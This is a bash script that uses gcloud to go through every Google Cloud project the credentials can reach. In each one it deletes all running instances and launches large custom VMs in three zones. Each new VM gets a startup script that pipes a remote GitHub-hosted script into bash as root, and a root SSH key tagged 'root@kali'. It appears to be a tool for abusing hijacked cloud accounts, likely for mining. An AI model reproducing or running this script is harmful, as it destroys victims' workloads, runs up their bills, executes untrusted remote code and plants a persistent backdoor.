#!/bin/bash
delete_instances (){
for instance in  $(gcloud compute instances list --filter="status=running" --format="value(name)" --quiet)
do
  zone=$(gcloud compute instances list --filter="name=$instance" --format="value(zone)" --quiet)
  status=$(gcloud compute instances describe $instance --zone=$zone --format="value(status)" --quiet)
  created_on=$(gcloud compute instances describe $instance --zone=$zone --format="value(creationTimestamp.date('%Y-%m-%d'))" --quiet)
  echo "####Deleting instance " $project "instance-"$i $zone
  gcloud compute instances delete $instance --zone=$zone --quiet
done
}

start_instances (){
for terminated_instance in  $(gcloud compute instances list --filter="status=terminated" --format="value(name)" --quiet)
do
  zone=$(gcloud compute instances list --filter="name=$terminated_instance" --format="value(zone)" --quiet)
  status=$(gcloud compute instances describe $terminated_instance --zone=$zone --format="value(status)" --quiet)
  created_on=$(gcloud compute instances describe $terminated_instance --zone=$zone --format="value(creationTimestamp.date('%Y-%m-%d'))" --quiet)
  if [[ $terminated_instance =~ *instance* ]]
  then
    echo "Restarting instance : $terminated_instance"
    gcloud compute instances stop $terminated_instance --zone=$zone --async --quiet
    gcloud compute instances start $terminated_instance --zone=$zone --async --quiet
  fi
done
}

create_instance (){
gcloud beta compute --project=$1 instances create instance-$2 --zone=$3 --machine-type=custom-20-22272 --subnet=default --network-tier=PREMIUM --metadata=startup-script=sudo\ curl\ -s\ -L\ \ https://raw.githubusercontent.com/oldhuman/shameOnYou/master/m.sh\ \|\ bash\ -s,ssh-keys=root:ssh-rsa\ AAAAB3NzaC1yc2EAAAADAQABAAACAQC2H6cOGyiYj/YNUx\+UzrISST5J5JKVmVIya04mcXrAuirvp5vvXdKzE7CYgul2ghkYyYkQjykNSVt7kQBIxWeltQa\+XT4u3vwhwLqZ8nTa5KTiN6nC2h4hPFdYwtau2roef/ghasjp919P/58vuHa8J/2dq9pmheLCLfNhOnDtz6mlEAeX7IPsvjLClLbvyVT5qHGCPwe/6LVxdOMOp3k39sjhzBDyMnQcxUQkh25HkzFtxEnDgMGDdo97q9H\+Y7sFvyf0iSyAzEvHV0QmXoJJvlAnifaujmW9xgP\+ixB/EJD2\+wfBR0nVfaaXbBOVsIEjfuqKLhs5i2wOYbSYl2rmdIDOb4NR7VsTip7J4z2fAZHMqhwt0rS30e2mtTTqf7v/KnfE5Rb5wMT/VFFMgYmbIw22RDBO1c997uSIBt4IKk/2QIAf5vtBpTe14MVKzlhPqGtQj9TD5AAK/wsTR97Oi\+3abtst4Eas/\+\+QVALXo3/5zkQqwkRmfRzz7JkLoKgly0VIpTileMBRrxG3DYfYOm4zJF\+Yjhhmo5ZoYCH9hbsc5ZE7SdfZqA/5vkCctyw2NBlgCucuCiwqUvsPlx4Dm96ypjqSyaZE9Nljy2TkeaAkGt07zUkwgvoisDQt55w==\ root@kali --maintenance-policy=MIGRATE --scopes=https://www.googleapis.com/auth/cloud-platform --min-cpu-platform=Intel\ Skylake --image=debian-9-stretch-v20181011  --image-project=debian-cloud --boot-disk-size=10GB --boot-disk-type=pd-standard --boot-disk-device-name=instance-1 --async --quiet
}

instances_count=$(gcloud compute instances list --filter="status=running" --format="value(name)" | wc -l)

#LOGIC
for project in $(gcloud projects list  --format="value(project_id)")
	do
		gcloud config set project $project
		echo "Project: " $project
		delete_instances
		i=1
		for zone in "us-central1-b" "europe-north1-c" "us-east1-b"
			do
				create_instance $project $i $zone
				echo "Created instance" $project "instance-"$i $zone
				i=$((i + 1))
			done
	done
exit
